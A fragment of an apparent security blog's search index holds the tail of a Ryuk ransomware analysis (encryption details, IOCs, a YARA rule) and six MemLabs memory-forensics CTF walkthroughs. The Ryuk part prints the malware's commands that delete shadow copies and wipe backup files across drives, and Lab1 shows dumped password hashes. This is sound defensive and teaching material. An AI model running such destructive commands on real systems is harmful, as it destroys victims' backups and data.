shadowstorage /for=d: /on=d: /maxsize=401MB vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded vssadmin Delete Shadows /all /quiet del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk del /s /f /q d:\\*.VHD d:\\*.bac d:\\*.bak d:\\*.wbcat d:\\*.bkf d:\\Backup*.* d:\\backup*.* d:\\*.set d:\\*.win d:\\*.dsk del /s /f /q e:\\*.VHD e:\\*.bac e:\\*.bak e:\\*.wbcat e:\\*.bkf e:\\Backup*.* e:\\backup*.* e:\\*.set e:\\*.win e:\\*.dsk del /s /f /q f:\\*.VHD f:\\*.bac f:\\*.bak f:\\*.wbcat f:\\*.bkf f:\\Backup*.* f:\\backup*.* f:\\*.set f:\\*.win f:\\*.dsk del /s /f /q g:\\*.VHD g:\\*.bac g:\\*.bak g:\\*.wbcat g:\\*.bkf g:\\Backup*.* g:\\backup*.* g:\\*.set g:\\*.win g:\\*.dsk del /s /f /q h:\\*.VHD h:\\*.bac h:\\*.bak h:\\*.wbcat h:\\*.bkf h:\\Backup*.* h:\\backup*.* h:\\*.set h:\\*.win h:\\*.dsk del %0   The Encryption Process   Ryuk uses a multi threading approach for the encryption process, it creates a new thread for each file it encrypts which makes it very fast.   It starts enumerating files using FindFirstFileW() and FindNextFileW() then it passes each file name to a new encryption thread. Note that Ryuk avoids encrypting these file extensions:   .dll .lnk .hrmlog .ini .exe   Each encryption thread starts by generating a random 256 AES encryption key using CryptGenKey(), Ryuk utilizes the WindowsCrypto API for the encryption.      Then it goes into the typical encryption loop, the files are encrypted in chunks with a chunk size of 1000000 bytes.                                    Finally Ryuk write a metadata block of size 274 bytes at the end of the file. The first 6 bytes are the keyword HERMES.      After that, The AES key is encrypted with an RSA public key before it’s written to the end of the file and then exported using CryptExportKey(), This function generates 12 bytes of Blob information + 256 bytes (the encrypted key).      The RSA public key is embedded in the executable, it’s imported using CryptImportKey() and passed to every encryption thread.                                    We can see at the end of the encryption routine a check if the keyword HERMES is present at the end of the file (which indicates the file is encrypted).   This check is actually done before encrypting the file to avoid encrypting it twice.      Here is an example of the complete metadata block:      Encrypting Network Shares   Ryuk enumerates network shares using WNetOpenEnumW() and WNetEnumResourceA() respectively.      For each network resource found, the resource’s name will be appended to a list separated by a semicolon. This list will be used later to encrypt these network shares with the same encryption process above.   IOCs   Hashes   Ryuk: 8b0a5fb13309623c3518473551cb1f55d38d8450129d4a3c16b476f7b2867d7   Dropper: 23f8aa94ffb3c08a62735fe7fee5799880a8f322ce1d55ec49a13a3f85312db2   Files   C:\\Users\\Public\\window.bat   Registry   HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run   Emails   WayneEvenson@protonmail[.]com   WayneEvenson@tutanota[.]com   Yara Rule   rule Ryuk {     meta:         author = \"N1ght-W0lf\"         description = \"Detect Ryuk Samples\"         date = \"2020-05-08\"     strings:         $s1 = \"RyukReadMe.txt\" ascii wide         $s2 = \"No system is safe\" ascii wide         $s3 = \"svchos\" ascii wide fullword         $s4 = \"vssadmin Delete Shadows /all /quiet\" ascii wide         $s5 = \"UNIQUE_ID_DO_NOT_REMOVE\" ascii wide         $s7 = \"\\\\users\\\\Public\\\\window.bat\" ascii wide         $s6 = \"HERMES\" ascii wide      condition:         5 of them }   External References   https://blog.malwarebytes.com/threat-spotlight/2019/12/threat-spotlight-the-curious-case-of-ryuk-ransomware/   https://research.checkpoint.com/2018/ryuk-ransomware-targeted-campaign-break/   https://app.any.run/tasks/81eaa3cf-eb75-411f-adba-b09472927155/   https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672   https://www.codeproject.com/Articles/1658/Obtain-the-plain-text-session-key-using-CryptoAPI  ","categories": ["Malware Analysis"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/malware%20analysis/ryuk-ransomware/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/malware-analysis/ryuk-ransomware/logo.png"
      },{
        "title": "MemLabs - Lab1",
        "excerpt":"MemLabs is an educational, introductory set of CTF-styled challenges which is aimed to encourage students, security researchers and CTF  players to get started with the field of Memory Forensics.   Each challenge has a description along with a memory dump file. We are supposed to get all the flags using memory forensics tools (mainly volatility).   You can read more about MemLabs here: MebLabs      Challenge Description     My sister’s computer crashed. We were very fortunate to recover this  memory dump. Your job is get all her important files from the system.  From what we remember, we suddenly saw a black window pop up with some  thing being executed. When the crash happened, she was trying to draw  something. Thats all we remember from the time of crash.     Note: This challenge is composed of 3 flags.     Challenge file: MemLabs_Lab1    The first thing to do with a memory dump file is to identify the operating system, for that we use imageinfo plugin.   $ volatility -f MemoryDump_Lab1.raw imageinfo      We can see volatility has a lot of suggestions for the profile, usually the first one is sufficient.   Next we check the running processes using pslist plugin.   $ volatility -f MemoryDump_Lab1.raw --profile Win7SP1x64 pslist      There are 3 interesting processes here, let’s start with cmd.exe. This process indicates that commands were executed on the system.   We can use consoles plugin to see the output   $ volatility -f MemoryDump_Lab1.raw --profile Win7SP1x64 consoles      If you look closely to the output of the command St4G3$1, you can spot some Base64 text. If we decode it we get the flag of stage 1.   $ echo ZmxhZ3t0aDFzXzFzX3RoM18xc3Rfc3Q0ZzMhIX0= | base64 -d flag{th1s_1s_th3_1st_st4g3!!}      Flag 1: flag{th1s_1s_th3_1st_st4g3!!}    Next we will focus on the second interesting process, which is mspaint.exe. The PID of this process is 2424.   If you go back to the challenge description, we can see that the user was drawing something (using mspaint of course).   After some googling, I found that we can dump the mspaint’s process memory to extract the image back.   So let’s use memdump plugin to extract some data.   $ volatility -f MemoryDump_Lab1.raw --profile Win7SP1x64 memdump -p 2424 -D lab1_output/   The output is written to 2424.dmp, we need to rename it to 2424.data to be able to open it in Gimp.   After playing a bit with the width and offset. I got an image which is somewhat flipped. I rotated it 180 degrees then flipped it horizontally and Voila!, I got the flag.                                       Flag 2: flag{G00d_Boy_good_girL}    The third interesting process is WinRAR.exe with PID 1512, we can use cmdline plugin to see the associated command line.   $ volatility -f MemoryDump_Lab1.raw --profile Win7SP1x64 cmdline | grep WinRAR Volatility Foundation Volatility Framework 2.6.1 WinRAR.exe pid:   1512 Command line : \"C:\\Program Files\\WinRAR\\WinRAR.exe\" \"C:\\Users\\Alissa Simpson\\Documents\\Important.rar\"   Great, we got the name of the rar file which is Important.rar (looks important).   Next we can use filescan plugin to get the psychical offset of that file in memory.   $ volatility -f MemoryDump_Lab1.raw --profile Win7SP1x64 filescan | grep Important.rar Volatility Foundation Volatility Framework 2.6.1 0x000000003fa3ebc0      1      0 R--r-- \\Device\\HarddiskVolume2\\Users\\Alissa Simpson\\Documents\\Important.rar 0x000000003fac3bc0      1      0 R--r-- \\Device\\HarddiskVolume2\\Users\\Alissa Simpson\\Documents\\Important.rar 0x000000003fb48bc0      1      0 R--r-- \\Device\\HarddiskVolume2\\Users\\Alissa Simpson\\Documents\\Important.rar   We can pick any of these offsets, To dump the file we can use dumpfiles plugin.   $ volatility -f MemoryDump_Lab1.raw --profile Win7SP1x64 dumpfiles -Q 0x000000003fa3ebc0 -D lab1_output/ Volatility Foundation Volatility Framework 2.6.1 DataSectionObject 0x3fa3ebc0   None   \\Device\\HarddiskVolume2\\Users\\Alissa Simpson\\Documents\\Important.rar   The file is dumped under the name file.None.0xfffffa8001034450.dat, let’s rename and unrar it.   $ mv file.None.0xfffffa8001034450.dat Important.rar $ unrar e Important.rar   UNRAR 5.61 beta 1 freeware      Copyright (c) 1993-2018 Alexander Roshal  Extracting from Important.rar  Password is NTLM hash(in uppercase) of Alissa's account passwd.  Enter password (will not be echoed) for flag3.png:    The file is password protected, but we can see a comment that says the password is the NTLM hash of Alissa’s account passwd.   To get the password hash, we can use hashdump plugin.   $ volatility -f MemoryDump_Lab1.raw --profile Win7SP1x64 hashdump Volatility Foundation Volatility Framework 2.6.1 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SmartNet:1001:aad3b435b51404eeaad3b435b51404ee:4943abb39473a6f32c11301f4987e7e0::: HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f0fc3d257814e08fea06e63c5762ebd5::: Alissa Simpson:1003:aad3b435b51404eeaad3b435b51404ee:f4ff64c8baac57d22f22edc681055ba6:::      Windows stores two hashes with each password, delimited by colons. The first one is an extremely insecure, obsolete hash using the LANMAN algorithm. Windows operating systems since Vista no longer use LANMAN hashes, so they are filled with a dummy value starting with “aad”.     The second hash is the newer NTLM hash, which is much better than LANMAN hashes, but still extremely insecure and much more easily cracked than Linux or Mac OS X hashes.    The desired NTLM hash is f4ff64c8baac57d22f22edc681055ba6 (remember it must be in uppercase).   After decompressing the file, we get an image with the flag.         Flag 3: flag{w3ll_3rd_stage_was_easy}   ","categories": ["CTF Writeups"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/ctf%20writeups/memlabs-lab1/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/ctf-writeups/memlabs/logo.png"
      },{
        "title": "MemLabs - Lab2",
        "excerpt":"   Challenge Description     One of the clients of our company, lost the access to his system due  to an unknown error. He is supposedly a very popular “environmental”  activist. As a part of the investigation, he told us that his go to  applications are browsers, his password managers etc. We hope that you  can dig into this memory dump and find his important stuff and give it  back to us.     Note: This challenge is composed of 3 flags.     Challenge file: MemLabs_Lab2    First we need to identify the operating system of the memory image.   $ volatility -f MemoryDump_Lab2.raw imageinfo      Next, let’s check the processes list.   $ volatility -f MemoryDump_Lab2.raw --profile Win7SP1x64 pslist      We can see interesting processes like chrome and KeePass. but first let’s look back at the description, note the quoted word \"environmental\". I think it’s a hint for environment variables, so let’s go down this way first.   $ volatility -f MemoryDump_Lab2.raw --profile Win7SP1x64 envars ........ 320 csrss.exe      0x0000000000481320    NEW_TMP    C:\\Windows\\ZmxhZ3t3M2xjMG0zX1QwXyRUNGczXyFfT2ZfTDRCXzJ9 ........ 424 wininit.exe    0x000000000030a600    NEW_TMP    C:\\Windows\\ZmxhZ3t3M2xjMG0zX1QwXyRUNGczXyFfT2ZfTDRCXzJ9 ........ 812 svchost.exe    0x0000000000221320    NEW_TMP    C:\\Windows\\ZmxhZ3t3M2xjMG0zX1QwXyRUNGczXyFfT2ZfTDRCXzJ9 ........   We can see the environment variable NEW_TMP in every process with a value that looks like Base64. so let’s decode it.   $ echo ZmxhZ3t3M2xjMG0zX1QwXyRUNGczXyFfT2ZfTDRCXzJ9 | base64 -d flag{w3lc0m3_T0_$T4g3_!_Of_L4B_2}   Great, first stage is done.      Flag 1: flag{w3lc0m3_T0_$T4g3_!_Of_L4B_2}    Next, let’s check this KeePass process, looks like a password manager.   After some googling, I learned that KeePass stores the passwords in a database with the extension \".kdbx\" and looks it with a master password.   So let’s check if this database is in memory.   $ volatility -f MemoryDump_Lab2.raw --profile Win7SP1x64 filescan | grep \".kdbx\" Volatility Foundation Volatility Framework 2.6.1 0x000000003fb112a0     16      0 R--r-- \\Device\\HarddiskVolume2\\Users\\SmartNet\\Secrets\\Hidden.kdbx   And here it’s, now let’s dump it.   $ volatility -f MemoryDump_Lab2.raw --profile Win7SP1x64 dumpfiles -Q 0x000000003fb112a0 -D lab2_output/ Volatility Foundation Volatility Framework 2.6.1 DataSectionObject 0x3fb112a0   None   \\Device\\HarddiskVolume2\\Users\\SmartNet\\Secrets\\Hidden.kdbx   The only thing left is to get the master password, I tried scanning files for any password like file.   $ volatility -f MemoryDump_Lab2.raw --profile Win7SP1x64 filescan | grep -i \"password\" Volatility Foundation Volatility Framework 2.6.1 ......... 0x000000003fce1c70      1      0 R--r-d \\Device\\HarddiskVolume2\\Users\\Alissa Simpson\\Pictures\\Password.png .........   Look at that, an image named Password!!! looks interesting, let’s dump it.   $ volatility -f MemoryDump_Lab2.raw --profile Win7SP1x64 dumpfiles -Q 0x000000003fce1c70 -D lab2_output/ Volatility Foundation Volatility Framework 2.6.1 DataSectionObject 0x3fce1c70   None   \\Device\\HarddiskVolume2\\Users\\Alissa Simpson\\Pictures\\Password.png      If you look closely at the bottom right, you can spot the password.   Now let’s use this password to open the database in KeePass.                                    The flag is the copied password.      Flag 2: flag{w0w_th1s_1s_Th3SeC0nD_ST4g3!!}    Now let’s return back the the chrome process, the first thing is to check the browsing history.   This amazing github repo has the plugin we need: Volatility-Plugins   volatility --plugins=plugins/ -f MemoryDump_Lab2.raw --profile Win7SP1x64 chromehistory &gt; chromehistory.txt      We have a mega link, the mega folder name is MemLabs_Lab2_Stage3 and it contained a single zip file named Important.zip (password protected).   I tried unzipping it with unzip but it gave me an error, so I used 7z.      Let’s get the password.   $ echo -n flag{w3ll_3rd_stage_was_easy} | sha1sum  6045dd90029719a039fd2d2ebcca718439dd100a   After unzipping the file, I got this image.         Flag 3: flag{oK_So_Now_St4g3_3_is_DoNE!!}   ","categories": ["CTF Writeups"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/ctf%20writeups/memlabs-lab2/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/ctf-writeups/memlabs/logo.png"
      },{
        "title": "MemLabs - Lab3",
        "excerpt":"   Challenge Description     A malicious script encrypted a very secret piece of information I had on my system. Can you recover the information for me please?     Note: This challenge is composed of only 1 flag and split into 2 parts.     Hint: You’ll need the first half of the flag to get the second.     You will need this additional tool to solve the challenge,     $ sudo apt install steghide       The flag format for this lab is: inctf{s0me_l33t_Str1ng}     Challenge file: MemLabs_Lab3    First we need to identify the operating system of the memory image.   $ volatility -f MemoryDump_Lab3.raw imageinfo      Next, let’s check the command line of the running processes.   $ volatility -f MemoryDump_Lab3.raw --profile Win7SP1x86_23418 cmdline Volatility Foundation Volatility Framework 2.6.1 ........ notepad.exe pid:   3736 Command line : \"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\Users\\hello\\Desktop\\evilscript.py ************************************************************************ notepad.exe pid:   3432 Command line : \"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\Users\\hello\\Desktop\\vip.txt   Interesting, we got two files. evilscript.py which as the name implies is evil and vip.txt which look like an important file.   Let’s search for these two files in memory.   $ volatility -f MemoryDump_Lab3.raw --profile Win7SP1x86_23418 filescan | egrep \"evilscript.py|vip.txt\" Volatility Foundation Volatility Framework 2.6.1 0x000000003de1b5f0      8      0 R--rw- \\Device\\HarddiskVolume2\\Users\\hello\\Desktop\\evilscript.py.py ......... 0x000000003e727e50      8      0 -W-rw- \\Device\\HarddiskVolume2\\Users\\hello\\Desktop\\vip.txt   Now that we have the offsets of the two files, let’s dump them.   $ volatility -f MemoryDump_Lab3.raw --profile Win7SP1x86_23418 dumpfiles -Q 0x000000003de1b5f0 -D lab3_output/ $ volatility -f MemoryDump_Lab3.raw --profile Win7SP1x86_23418 dumpfiles -Q 0x000000003de1b5f0 -D lab3_output   Here is the dumped python file:   import sys import string  def xor(s): \ta = ''.join(chr(ord(i)^3) for i in s) \treturn a  def encoder(x): \treturn x.encode(\"base64\")  if __name__ == \"__main__\": \tf = open(\"C:\\\\Users\\\\hello\\\\Desktop\\\\vip.txt\", \"w\") \tarr = sys.argv[1] \tarr = encoder(xor(arr)) \tf.write(arr) \tf.close()   This evil script is XORing the file vip.txt with a single character then Base64 encoding it.   And here is the content of the dumped text file:   am1gd2V4M20wXGs3b2U=   So we first need to Base64 decode it then XOR it again with same character to retrieve the original text.   $ python &gt;&gt;&gt; s = 'am1gd2V4M20wXGs3b2U=' &gt;&gt;&gt; s = s.decode('base64') &gt;&gt;&gt; ''.join(chr(ord(i)^3) for i in s) inctf{0n3_h4lf      First half: inctf{0n3_h4lf    Now that we have the first half of the flag, let’s hunt for the other half.   This one took me sometime, then I looked at the hint and it says something about steghide.   Steghide is a steganography program that is able to hide data in images and audio files and it supports JPEG and BMP images, so I decided to search memory for JPEG images.   $ volatility -f MemoryDump_Lab3.raw --profile Win7SP1x86_23418 filescan | grep \".jpeg\" Volatility Foundation Volatility Framework 2.6.1 0x0000000004f34148      2      0 RW---- \\Device\\HarddiskVolume2\\Users\\hello\\Desktop\\suspision1.jpeg   Would you look at that!!!, only one image and it looks suspicious :)   So let’s dump it.      It’s just a normal image, or is it ???   Here comes steghide, this image must have something hidden.   $ steghide extract -sf lab3_output/suspision1.jpeg  Enter passphrase:   It’s asking for a passphrase,  the hint clearly says that: You'll need the first half of the flag to get the second.   Let’s try the first half of the flag as the passphrase.   $ steghide extract -sf lab3_output/suspision1.jpeg  Enter passphrase: wrote extracted data to \"secret text\".   Voila!!! let’s get this secret text.   $ cat secret\\ text  _1s_n0t_3n0ugh}      Flag: inctf{0n3_h4lf_1s_n0t_3n0ugh}   ","categories": ["CTF Writeups"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/ctf%20writeups/memlabs-lab3/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/ctf-writeups/memlabs/logo.png"
      },{
        "title": "MemLabs - Lab4",
        "excerpt":"   Challenge Description     My system was recently compromised. The Hacker stole a lot of  information but he also deleted a very important file of mine. I have no idea on how to recover it. The only evidence we have, at this point of  time is this memory dump. Please help me.     Note: This challenge is composed of only 1 flag.     The flag format for this lab is: inctf{s0me_l33t_Str1ng}     Challenge file: MemLabs_Lab4    First we need to identify the operating system of the memory image.   $ volatility -f MemoryDump_Lab4.raw imageinfo      The next thing is to check running processes.   $ volatility -f MemoryDump_Lab4.raw --profile Win7SP1x64 pslist      The only interesting process here is StikyNot.exe (this is a rabbit hole, nothing important there).   Looking back at the challenge description, it says something about files and a deleted file. So we can use filescan to search for interesting files in memory, but  for the sake of variety, I will use iehistory plugin instead.      iehistory plugin recovers fragments of IE history index.dat cache files. It can find basic accessed links (via FTP or HTTP), redirected links (–REDR), and deleted entries (–LEAK). It applies to any process which loads and uses the wininet.dll library, not just Internet Explorer. Typically that includes Windows Explorer and even malware samples.    so we can use it to view the history of visited files and directories by windows explorer.   $ volatility -f MemoryDump_Lab4.raw --profile Win7SP1x64 iehistory .......... Process: 3012 explorer.exe Cache type \"URL \" at 0x42f5000 Record length: 0x100 Location: :2019062920190630: SlimShady@file:///C:/Users/SlimShady/Desktop/Important.txt Last modified: 2019-06-29 12:59:43 UTC+0000 Last accessed: 2019-06-29 07:29:43 UTC+0000 File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0   What do we have here, a text file that looks important!!!   Now let’s scan for this file in memory to dump it out.   $ volatility -f MemoryDump_Lab4.raw --profile Win7SP1x64 filescan | grep Important.txt Volatility Foundation Volatility Framework 2.6.1 0x000000003fc398d0     16      0 R--rw- \\Device\\HarddiskVolume2\\Users\\SlimShady\\Desktop\\Important.txt  $ volatility -f MemoryDump_Lab4.raw --profile Win7SP1x64 dumpfiles -Q 0x000000003fc398d0 -D lab4_output/ Volatility Foundation Volatility Framework 2.6.1 DataSectionObject 0x3fc398d0   None   \\Device\\HarddiskVolume2\\Users\\SlimShady\\Desktop\\Important.txt   Unfortunately, dumpfiles was not able to dump the text file (it was deleted by the hacker).   We need to know a little bit about the MFT table to solve this challenge.                  The NTFS file system contains a file called the master file table, or MFT. There is at least one entry in the MFT for every file on an NTFS file system volume. All information about a file, including its name, size, time and date stamps, permissions, and data content, is stored either in MFT entries, or in space outside the MFT that is described by MFT entries.                  As files are added to an NTFS file system volume, more entries are added to the MFT and the MFT increases in size. When files are deleted from an NTFS file system volume, their MFT entries are marked as free and may be reused. However, disk space that has been allocated for these entries is not reallocated, and the size of the MFT does not decrease.                  A file whose size is less than or equal to 1024 bytes will be stored directly in the MFT table (named “resident” file), if it exceeds 1024 bytes the table will only contain the information of its location (named “non-resident” file).            So let’s search for Important.txt in the MFT table.   $ volatility -f MemoryDump_Lab4.raw --profile Win7SP1x64 mftparser &gt; mft.txt      And here it’s, the flag characters are scattered across the file, anti-strings technique :)      Flag: inctf{1_is_n0t_EQu4l_7o_2_bUt_th1s_d0s3nt_m4ke_s3ns3}   ","categories": ["CTF Writeups"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/ctf%20writeups/memlabs-lab4/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/ctf-writeups/memlabs/logo.png"
      },{
        "title": "MemLabs - Lab5",
        "excerpt":"   Challenge Description     This challenge is composed of 2 flags but do you really think so? Maybe a little flag is hiding somewhere.     Note: There was a small mistake when making this challenge. If you find any string which has the string “L4B_3_D0n3*!!**” in it, please change it to “L4B_5_D0n3*!!**” and then proceed.     Hint: You’ll get the stage 2 flag only when you have the stage 1 flag.     Challenge file: MemLabs_Lab5    First we need to identify the operating system of the memory image.   $ volatility -f MemoryDump_Lab5.raw imageinfo      Next, let’s check the processes list.   $ volatility -f MemoryDump_Lab5.raw --profile Win7SP1x64 pslist      Interesting, there’s a WinRAR.exe process, let’s see what the cmdline for that process is.   $ volatility -f MemoryDump_Lab5.raw --profile Win7SP1x64 cmdline | grep WinRAR.exe Volatility Foundation Volatility Framework 2.6.1 WinRAR.exe pid:   2924 Command line : \"C:\\Program Files\\WinRAR\\WinRAR.exe\" \"C:\\Users\\SmartNet\\Documents\\SW1wb3J0YW50.rar\"   The rar file name is SW1wb3J0YW50.rar, let’s dump this file.   $ volatility -f MemoryDump_Lab5.raw --profile Win7SP1x64 filescan | grep SW1wb3J0YW50.rar Volatility Foundation Volatility Framework 2.6.1 0x000000003eed56f0      1      0 R--r-- \\Device\\HarddiskVolume2\\Users\\SmartNet\\Documents\\SW1wb3J0YW50.rar  $ volatility -f MemoryDump_Lab5.raw --profile Win7SP1x64 dumpfiles -Q 0x000000003eed56f0 -D lab5_output/ Volatility Foundation Volatility Framework 2.6.1 DataSectionObject 0x3eed56f0   None   \\Device\\HarddiskVolume2\\Users\\SmartNet\\Documents\\SW1wb3J0YW50.rar   Going ahead to unrar this file and I saw this comment.   $ unrar e SW1wb3J0YW50.rar  UNRAR 5.61 beta 1 freeware      Copyright (c) 1993-2018 Alexander Roshal Extracting from SW1wb3J0YW50.rar Enter password (will not be echoed) for Stage2.png:    Clearly this is stage2’s flag and the password for this file is stage1’s flag, so we need to get stage1’s flag first.   At this point I had no clue of what to do, so I tried my luck with iehistory (I explained it in the previous lab) and I notices something interesting.   $ volatility -f MemoryDump_Lab5.raw --profile Win7SP1x64 iehistory ......... Process: 1396 explorer.exe Cache type \"URL \" at 0x28c5900 Record length: 0x100 Location: Visited: Alissa Simpson@file:///C:/Users/Alissa%20Simpson/Pictures/ZmxhZ3shIV93M0xMX2QwbjNfU3Q0ZzMtMV8wZl9MNEJfM19EMG4zXyEhfQ.bmp ......... Process: 1396 explorer.exe Cache type \"URL \" at 0x28c5a00 Record length: 0x100 Location: Visited: Alissa Simpson@file:///C:/Users/Alissa%20Simpson/Pictures/ZmxhZ3shIV93M0xMX2QwbjNfU3Q0ZzMtMV8wZl9MNEJfNV9EMG4zXyEhfQ.bmp ......... Process: 1396 explorer.exe Cache type \"URL \" at 0x28c5c00 Record length: 0x100 Location: Visited: Alissa Simpson@file:///C:/Windows/AppPatch/ZmxhZ3shIV93M0xMX2QwbjNfU3Q0ZzMtMV8wZl9MNEJfNV9EMG4zXyEhfQ.bmp   This .bmp file is repeated multiple times and it’s names looks like Base64 string, so I tries to decode it.   $ echo ZmxhZ3shIV93M0xMX2QwbjNfU3Q0ZzMtMV8wZl9MNEJfNV9EMG4zXyEhfQ | base64 -d flag{!!_w3LL_d0n3_St4g3-1_0f_L4B_5_D0n3_!!}   Voila! we got the flag of stage1.      Flag 1: flag{!!w3LL_d0n3_St4g3-1_0f_L4B_5_D0n3!!}    Now let’s return back to the rar file.   $ unrar e SW1wb3J0YW50.rar  UNRAR 5.61 beta 1 freeware      Copyright (c) 1993-2018 Alexander Roshal Extracting from SW1wb3J0YW50.rar Enter password (will not be echoed) for Stage2.png:  Extracting  Stage2.png                                                OK  All OK   As I said before, the password is stage1’s flag.         Flag 2: flag{W1th_th1s_$taGe_2_1s_c0mPL3T3_!!}    ","categories": ["CTF Writeups"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/ctf%20writeups/memlabs-lab5/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/ctf-writeups/memlabs/logo.png"
      },{
        "title": "MemLabs - Lab6",
        "excerpt":"   Challenge Description     Note: This challenge is composed of 1 flag.     The flag format for this lab is: inctf{s0me_l33t_Str1ng}     Challenge file: MemLabs_Lab6    First we need to identify the operating system of the memory image.   $ volatility -f MemoryDump_Lab6.raw imageinfo      Next, let’s check the running processes.   $ volatility -f MemoryDump_Lab6.raw --profile Win7SP1x64 pslist      We can see some interesting processes here like WinRAR, chrome and firefox so let’s start with WinRAR.   $ volatility --plugins=plugins/ -f MemoryDump_Lab6.raw --profile Win7SP1x64 cmdline | grep WinRAR.exe Volatility Foundation Volatility Framework 2.6.1 WinRAR.exe pid:   3716 Command line : \"C:\\Program Files\\WinRAR\\WinRAR.exe\" \"C:\\Users\\Jaffa\\Desktop\\pr0t3ct3d\\flag.rar\"   Oh, that file name is interesting, let’s dump it.   $ volatility -f MemoryDump_Lab6.raw --profile Win7SP1x64 filescan | grep flag.rar Volatility Foundation Volatility Framework 2.6.1 0x000000005fcfc4b0     16      0 R--rwd \\Device\\HarddiskVolume2\\Users\\Jaffa\\Desktop\\pr0t3ct3d\\flag.rar  $ volatility -f MemoryDump_Lab6.raw --profile Win7SP1x64 dumpfiles -Q 0x000000005fcfc4b0 -D lab6_output/ Volatility Foundation Volatility Framework 2.6.1 DataSectionObject 0x5fcfc4b0   None   \\Device\\HarddiskVolume2\\Users\\Jaffa\\Desktop\\pr0t3ct3d\\flag.rar   Next, let’s try to unrar it.   $ unrar e flag.rar  UNRAR 5.61 beta 1 freeware      Copyright (c) 1993-2018 Alexander Roshal Extracting from flag.rar Enter password (will not be echoed) for flag2.png:    Of course it’s encrypted :(   Let’s take a step back and try more plugins.   $ volatility --plugins=plugins/ -f MemoryDump_Lab6.raw --profile Win7SP1x64 consoles      I noticed the author is running env command, I suspect it’s a hint for us.   So let’s try dumping the environment variables for WinRAR.      Awesome, not we now that the rar password is: easypeasyvirus.   $ unrar e flag.rar  UNRAR 5.61 beta 1 freeware      Copyright (c) 1993-2018 Alexander Roshal Extracting from flag.rar Enter password (will not be echoed) for flag2.png:  Extracting  flag2.png                                                 OK  All OK      Great, that looks like the second half of the flag.      Second half: aN_Am4zINg_!_i_gU3Ss???_}    Let’s return back the the chrome process, the first thing is to check the browsing history.   This amazing github repo has the plugin we need: Volatility-Plugins   $ volatility --plugins=plugins/ -f MemoryDump_Lab6.raw --profile Win7SP1x64 chromehistory &gt; chromehistory.txt   Scrolling through the history dump, I notices a pastebin link (https://pastebin.com/RSGSi1hk).      Here is what I found.      There is a link to a google drive doc along with the note David sent the key in mail.   The doc file is just some lorem ipsum text, but if you look carefully you can see a mega link (took me a while).      Let’s see what this mega link has.      Another password, I hate my life :(   At this point I got stuck, so I tried every volatility plugin I know about. Then the magic happened.   The screenshot plugin saved the day.   $ volatility --plugins=plugins/ -f MemoryDump_Lab6.raw --profile Win7SP1x64 screenshot -D lab6_output   It dumped 13 images, all of them are just white images except for this one.      There is a windows with the title Mega Drive Key ...., that looks promising. so let’s search for this string in memory.   $ strings MemoryDump_Lab6.raw | grep \"Mega Drive Key\" ......... Mega Drive Key - davidbenjamin939@gmail.com - Gmail top['GM_TRACING_THREAD_DETAILS_CHUNK_START'] = (window.performance &amp;&amp; window.performance.now) ? window.performance.now() : null; top._GM_setData({\"Cl6csf\":[[\"simls\",0,\"{\\\"2\\\":[{\\\"1\\\":0,\\\"2\\\":{\\\"1\\\":\\\"Mega Drive Key\\\",\\\"2\\\":\\\"THE KEY IS zyWxCjCYYSEMA-hZe552qWVXiPwa5TecODbjnsscMIU\\\" .........   Look at that, we got the key (a good pair of eyes required). the key is: zyWxCjCYYSEMA-hZe552qWVXiPwa5TecODbjnsscMIU.   After decrypting the file, it turned out to be an image. but unfortunately it was corrupted.   Opening it with hexedit, the IHDR part was corrupted (iHDR). so all we need to do is to change i (69) to I (49).      Finally we got the first part of the flag, that was a long journey.         Flag: inctf{thi5cH4LL3Ng3_!s_g0nn4_b3_?_aN_Am4zINg_!_i_gU3Ss???}   ","categories": ["CTF Writeups"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/ctf%20writeups/memlabs-lab6/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/ctf-writeups/memlabs/logo.png"
      },{
        "title": "Deep Analysis of SmokeLoader",
